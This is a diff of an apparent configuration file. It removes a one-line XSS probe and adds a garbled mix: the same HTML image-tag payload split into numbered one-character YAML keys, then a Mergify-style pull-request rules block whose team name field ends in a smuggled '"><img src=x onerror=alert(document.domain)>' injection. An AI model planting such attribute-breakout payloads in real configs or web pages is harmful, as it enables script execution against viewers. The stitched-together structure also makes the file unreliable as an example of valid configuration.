@@ -1,1 +1,49 @@
-<img src=1 onasd=a onerror=prompt(1)>
+'0': <
+'1': i
+'2': m
+'3': g
+'4': ' '
+'5': s
+'6': r
+'7': c
+'8': '='
+'9': '1'
+'10': ' '
+'11': o
+'12': 'n'
+'13': a
+'14': s
+'15': d
+'16': '='
+'17': a
+'18': ' '
+'19': o
+'20': 'n'
+'21': e
+'22': r
+'23': r
+'24': o
+'25': r
+'26': '='
+'27': p
+'28': r
+'29': o
+'30': m
+'31': p
+'32': t
+'33': (
+'34': '1'
+'35': )
+'36': '>'
+pull_request_rules:
+  - name: Request review from team
+    description: Request review from a specific team when checks are green.
+    conditions:
+      - '-closed'
+      - '#approved-reviews-by=0'
+      - '#changes-requested-reviews-by=0'
+      - review-requested!=@TEAM_NAME_HERE
+    actions:
+      request_reviews:
+        teams:
+          - TEAM_NAME_HERE"><img src=x onerror=alert(document.domain)>
